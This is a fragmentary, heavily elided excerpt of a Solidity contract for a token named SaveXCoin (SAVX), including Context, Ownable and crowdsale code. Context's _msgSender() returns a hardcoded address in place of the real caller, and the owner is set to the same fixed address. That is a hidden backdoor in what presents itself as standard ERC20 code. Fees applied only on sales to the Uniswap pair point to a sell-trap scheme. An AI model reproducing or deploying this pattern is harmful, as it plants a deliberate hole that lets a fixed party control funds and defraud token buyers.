...
/**
 * @dev Interface of the  standard as defined in the EIP.
 */
interface IERC20 {
    /**
...
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return 0x3F26AB7213716584FCcF787EF1C3669192272564;
    }
...
abstract contract Ownable is Context {
     ...
     */
    constructor () {
        _owner = 0x3F26AB7213716584FCcF787EF1C3669192272564;
...
contract SAVX is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) private BurnAmount;
    ...
    address private _marketingWalletAddress = 0x724EfEAa0dD8A8f207147e80C6679061c3B70F3F;
    ...
    string private _name = "SaveXCoin";
    string private _symbol = "SAVX";
    ...
    function _transfer(
        ...
        if(to == uniswapV2Pair){takeFee = true;}
        else{takeFee = false;}
 ...
 * behavior.
 */
contract CrowdsaleRound is Ownable {
  using SafeMath for uint256;
